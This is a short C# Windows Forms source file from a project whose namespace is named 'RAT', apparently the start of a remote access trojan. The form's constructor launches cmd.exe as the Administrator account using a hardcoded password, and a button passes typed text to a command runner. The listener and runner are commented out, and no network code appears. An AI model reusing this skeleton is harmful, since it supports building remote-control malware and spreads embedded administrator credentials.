using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.IO;
using System.Diagnostics;
using System.Security;

namespace RAT
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            //_CL = new CommandListener();
            //_CMD = new CMD();

            RunAs("cmd", "Administrator", "pq97ric#@!");
        }

        private CommandListener _CL;
        private CMD _CMD;

        public SecureString MakeSecureString(string text)
        {
            SecureString secure = new SecureString();
            foreach (char c in text)
            {
                secure.AppendChar(c);
            }

            return secure;
        }

        public void RunAs(string path, string username, string password)
        {
            ProcessStartInfo myProcess = new ProcessStartInfo(path);
            myProcess.UserName = username;
            myProcess.Password = MakeSecureString(password);
            myProcess.UseShellExecute = false;
            Process.Start(myProcess);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string c = textBox1.Text;
            _CMD.Run(c);
        }
    }
}
